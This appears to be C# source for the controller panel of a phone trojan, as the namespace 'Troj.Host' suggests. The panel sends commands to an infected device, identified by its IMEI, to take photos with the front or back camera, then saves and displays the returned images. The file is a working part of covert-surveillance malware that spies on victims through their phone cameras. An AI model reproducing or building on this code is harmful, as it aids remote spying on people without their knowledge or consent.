using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using InOut;
using InOut.Utils;

namespace IIE.Phone.Troj.Host.Panel
{
    public partial class TakePhotoPanel : UserControl
    {
        private readonly string imei;
        private readonly IServer server;
        private string picrecordFolder;

        public TakePhotoPanel(string imei, IServer server)
        {
            this.imei = imei;
            this.server = server;
            Control.CheckForIllegalCrossThreadCalls = false;
            InitializeComponent();
        }

        private void btnPrePhoto_Click(object sender, System.EventArgs e)
        {
            var buffer = new Byte[4];
            var memory = new MemoryStream(buffer);
            memory.WriteInt32(0);
            memory.Close();
            server.CommandSender(imei, Protocol.GetPicture, buffer);
        }

        private void btnBackPhoto_Click(object sender, System.EventArgs e)
        {
            var buffer = new Byte[4];
            var memory = new MemoryStream(buffer);
            memory.WriteInt32(1);
            memory.Close();
            server.CommandSender(imei, Protocol.GetPicture, buffer);
        }
        public void UpdatePicture(byte[] data)
        {
            var stream = new MemoryStream(data);
            var bitmap = new Bitmap(stream);
            
            picrecordFolder = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Record");
            string picfileName = DateTime.Now.ToString("yyyyMMddHHmmss") + ".png";
            //using (bitmap)
            //{
            bitmap.Save(picrecordFolder + "\\" + picfileName, System.Drawing.Imaging.ImageFormat.Png);
            //}
            stream.Close();
            pbPhoto.Image = Image.FromFile(picrecordFolder + "\\" + picfileName);
        }

        private void pbPhoto_Click(object sender, EventArgs e)
        {
            Bitmap bitmap = pbPhoto.Image as Bitmap;

            bitmap.RotateFlip(RotateFlipType.Rotate270FlipXY);//从左开始转

            pbPhoto.Image = bitmap;
        }
    }
}
